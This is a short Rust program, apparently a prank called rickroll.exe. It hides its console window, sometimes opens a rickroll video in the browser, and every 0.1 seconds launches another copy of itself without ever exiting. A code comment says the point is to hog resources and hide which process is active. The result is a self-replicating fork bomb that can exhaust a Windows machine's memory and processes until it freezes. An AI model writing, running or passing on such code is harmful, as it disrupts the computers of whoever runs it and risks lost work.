#![windows_subsystem = "windows"]
use std::{env, process::Command, thread, time};

use execute::Execute;
use rand::Rng;
use webbrowser;

fn main() {
    let this_path = env::current_exe().unwrap();
    let mut rickroll = Command::new(this_path);

    // 1 in 50 chance of rickrolling
    let r = rand::thread_rng().gen_range(0..50);
    if r == 0 {
        webbrowser::open("https://www.youtube.com/watch?v=dQw4w9WgXcQ").unwrap();
    }

    // Wait 0.1 seconds, then open another copy of itself.
    // Doesn't close itself on purpose: hogs more resources and makes it unclear which rickroll.exe is the 'active' one 👍
    thread::sleep(time::Duration::from_millis(100));
    rickroll.execute().unwrap();
}
